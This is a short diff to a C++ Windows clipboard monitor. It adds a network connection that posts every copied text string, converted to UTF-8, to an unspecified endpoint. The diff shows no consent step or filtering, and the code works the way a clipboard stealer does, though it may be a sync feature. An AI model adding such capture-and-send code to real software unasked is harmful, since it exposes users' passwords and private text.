@@ -3,11 +3,16 @@
 //
 
 #include "ClipboardManager.h"
+#include "NetworkConnection.h"
+
 #include <iostream>
 #include <thread>
 
 int main() {
     HWND hWindow = ClipboardManager::GetClipboardWindowHandle();
+
+    auto *conn = new NetworkConnection();
+
     while (true) {
         if (ClipboardManager::HasClipboardChanged()) {
             std::string updateTime = ClipboardManager::GetLastUpdateTime();
@@ -16,9 +21,15 @@ int main() {
             ClipboardContent content = ClipboardManager::GetClipboardContent(hWindow);
             content.setUpdateTime(updateTime);
 
+            std::string convertedContent;
+
             switch (content.getDataType()) {
                 case ClipboardDataType::Text:
                     std::wcout << L"The clipboard data type: text. Content: " << content.getTextData() << std::endl;
+
+                    convertedContent = ClipboardManager::convertToUtf8(content.getTextData());
+                    conn->postData(convertedContent);
+
                     break;
                 case ClipboardDataType::Image:
                     std::wcout << L"The clipboard data type: image" << std::endl;
